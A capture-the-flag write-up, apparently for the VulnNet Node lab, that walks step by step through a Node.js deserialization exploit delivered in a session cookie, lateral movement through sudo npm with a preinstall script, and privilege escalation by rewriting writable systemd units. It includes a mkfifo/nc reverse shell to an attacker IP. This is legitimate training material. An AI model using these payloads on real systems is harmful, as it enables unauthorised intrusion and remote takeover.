@@ -1,0 +1,112 @@
+After the previous breach, VulnNet Entertainment states it won’t happen again. Can you prove they’re wrong?
+
+VulnNet Entertainment has moved its infrastructure and now they’re confident that no breach will happen again. You’re tasked to prove otherwise and penetrate their network.
+
+    Difficulty: Easy
+    Web Language: JavaScript
+
+This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck! 
+
+
+Initial foothold
+
+We use nmap -sC -sV $IP and it detects only one port
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Node.js Express framework
+|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
+
+Connecting to this port in a browser shows a web page with posts, and a login button.
+Enumerating the web server doesn’t reveal much more
+
+gobuster dir -u http://$IP:8080 -w /usr/share/Seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.36.223:8080/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/04/30 19:16:37 Starting gobuster
+===============================================================
+/css (Status: 301)
+/img (Status: 301)
+/login (Status: 200)
+/Login (Status: 200)
+
+Using Burp Suite to intercept the request we find a session cookie without being logged in.
+
+After decoding it and trying to tamper its content without success, I eventually discovered that the web server was suffering from an unserialization vulnerability.
+We intercept the request in BurpSuite, remove the content of the session cookie, and replace it with some other text and we get a server error
+
+Searching for “nodejs unserialize reverse shell” we find a reverse shell payload
+
+python nodejsshell.py $IP $port
+
+Now let’s generate the serialized payload and add IIFE brackets after the function body.
+
+{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,[REDACTED],84,41,59,10))}()"}
+
+we base64 encode it and use this base64 string as the session cookie. we can put the value of our payload in "username":"{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,[REDACTED],84,41,59,10))}()"}"
+
+Send the request and we get our reverse shell.
+
+Lateral move
+There is no user flag in /home/www/, but the presence of /home/serv-manage/ makes me thing I have to move laterally
+This assumption is also confirmed with privileges we have to run npm as serv-manage after using sudo -l
+
+Checking on GTFOBins reveals that we can move laterally: 
+
+www@vulnnet-node:~$ mkdir ~/tmp
+www@vulnnet-node:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
+www@vulnnet-node:~$ sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
+$ id
+id
+uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
+
+Root flag
+
+We can start and stop the vulnnet-auto.timer as well as reload services, as root with sudo without password.
+In addition, we have write access to the vulnnet-auto.timer script which actually calls another script (vulnnet-job.service).
+
+Both scripts are writable to us. Let’s stop the vulnnet-auto.timer service first sudo -u root /bin/systemctl stop vulnnet-auto.timer
+We modify vulnnet-auto.timer so that it will run every minute instead of every 30 minutes
+
+cat > /etc/systemd/system/vulnnet-auto.timer << EOF 
+[Unit]
+Description=Run VulnNet utilities every 30 min
+ 
+[Timer]
+OnBootSec=0min
+OnCalendar=*:0/1
+Unit=vulnnet-job.service
+ 
+[Install]
+WantedBy=basic.target
+EOF 
+
+and we modify the vulnnet-job.service to change the exec command to call a reverse shell
+
+cat > /etc/systemd/system/vulnnet-job.service << EOF
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+ 
+[Service]
+Type=forking
+ExecStart=/bin/sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 5555 >/tmp/f'
+ 
+[Install]
+WantedBy=multi-user.target
+EOF
+
+
+now we start a listener in the attacking machine and reload the services
+sudo -u root /bin/systemctl daemon-reload
+sudo -u root /bin/systemctl start vulnnet-auto.timer
+
+and we get root privileges.
